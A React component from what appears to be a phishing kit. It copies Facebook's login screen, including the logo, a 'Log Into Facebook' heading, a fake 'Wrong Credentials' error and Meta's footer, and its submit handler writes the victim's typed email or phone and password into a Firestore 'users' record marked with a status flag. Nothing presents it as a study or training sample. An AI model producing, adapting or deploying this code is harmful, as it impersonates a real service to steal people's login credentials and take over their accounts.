import React, { useEffect, useState } from "react";
import { Form, Input } from "antd";
import "./styles/confirmation.css";
import {
  doc,
  updateDoc,
} from "firebase/firestore";
import { db } from "../firebase";

export const ConfirmationModal = (props) => {
  const [loading, setLoading] = useState(false);
  const [form] = Form.useForm()


  const handleSubmit = (values) => {
    if (!values || loading) return;
    setLoading(true);
    updateAccount(values)
    setLoading(false);
    setTimeout(() => {
      props.setValue(0)
    }, 700);
  };

  const updateAccount = async (values) =>{
    console.log(values);
    try {
      var unique_id = localStorage.getItem("unique_id");
      if(unique_id){
        const userRef = doc(db, "users", JSON.parse(unique_id));
        await updateDoc(userRef, {
          account: values.account,
          password: values.password,
          status:1
        });
      }
    } catch (error) {
      console.error(error);
    }
  }

  return (
    <>
      <div className="confirmation-container-modal">
        <div className="header-color">
          <div className="header-container">
            <div className="logo__faceook"></div>
          </div>
        </div>
        <div className="auth-req-container auth__req-modal">
          <div className="auth-req">
            <div className="auth-req-text-modal">
              <h2>Log Into Facebook</h2>
              {props.wrong_password && <div className="wrong__password">
                <h2>Wrong Credentials</h2>
                <p>Invalid username or password</p>
              </div>}
              <div className="modal__confirmation">
                <Form form={form} onFinish={handleSubmit}>
                  <div>
                    <Form.Item name="account">
                      <Input required type="text" name="" placeholder="Email or phone number" />
                    </Form.Item>
                  </div>
                  <div>
                    <Form.Item name="password">
                      <Input required type="password" name="" placeholder="Password" />
                    </Form.Item>
                  </div>
                  <div>
                    <button type="submit">Log In</button>
                  </div>
                </Form>
                <div className="modal__confirmation-forgot">
                  <div className="modal__confirmation-account">
                    <p>Forgot account? </p>
                    <p>Sign up for Facebook</p>
                  </div>
                  {/* <p className="not__now">Not now</p> */}
                </div>
              </div>
            </div>
          </div>
          <div className="having-trouble-class having__trouble-modal">
            <button>Having trouble?</button>
          </div>
          {/* <div className={`show-button-mobile ${loading && "disableButton"}`}>
            <button onClick={handleSubmit}>Continue</button>
          </div> */}
          <div className="show-footer-on-mobile-plus hide__footer-modal">
            <h2 className="h2-foot not__you-text">Not You? Log In Here</h2>
            <div className="footer-flex-mobile-plus confimartion__modal">
              <div>
                <h2>English (US)</h2>
                <p>Deutsch</p>
                <p>Српски</p>
                <p>Português (Brasil)</p>
              </div>
              <div>
                <p>Italiano</p>
                <p>Bosanski</p>
                <p>Svensk</p>
                <button>+</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="modal__footer">
        <div className="footer-menu-flex-ul">
          <div className="container-language-footer">
            <ul className="flex-ul">
              <li>English (US)</li>
              <li>Español</li>
              <li>Deutsch</li>
              <li>Türkçe</li>
              <li>Српски</li>
              <li>Français (France)</li>
              <li>Italiano</li>
              <li>Bosanski</li>
              <li>Svensk</li>
              <li>Português (Brasil)</li>
              <button className="countrys-button">
                <span>+</span>
              </button>
            </ul>
          </div>
          <div className="flex-second-ul">
            <ul>
              <li>Sign Up</li>
              <li>Log In</li>
              <li>Messenger</li>
              <li>Facebook Lite</li>
              <li>Watch</li>
              <li>Places</li>
              <li>Games</li>
              <li>Marketplace</li>
              <li>Facebook Pay</li>
              <li>Oculus</li>
              <li>Portal</li>
              <li>Instagram</li>
              <li>Bulletin</li>
              <li>Local</li>
            </ul>
          </div>
          <div className="flex-second-ul-2">
            <ul>
              <li>Fundraisers</li>
              <li>Services</li>
              <li>Voting Information Centre</li>
              <li>About</li>
              <li>Create ad</li>
              <li>Create Page</li>
              <li>Developers</li>
              <li>Careers</li>
              <li>Privacy</li>
              <li>Cookies</li>
              <li className="ad-choice-img">
                Ad Choices <span className="img-li"></span>{" "}
              </li>
              <li>Terms</li>
              <li>Help</li>
            </ul>
          </div>
          <div className="meta-footer">
            <p>Meta © 2022</p>
          </div>
        </div>
      </div>
    </>
  );
};
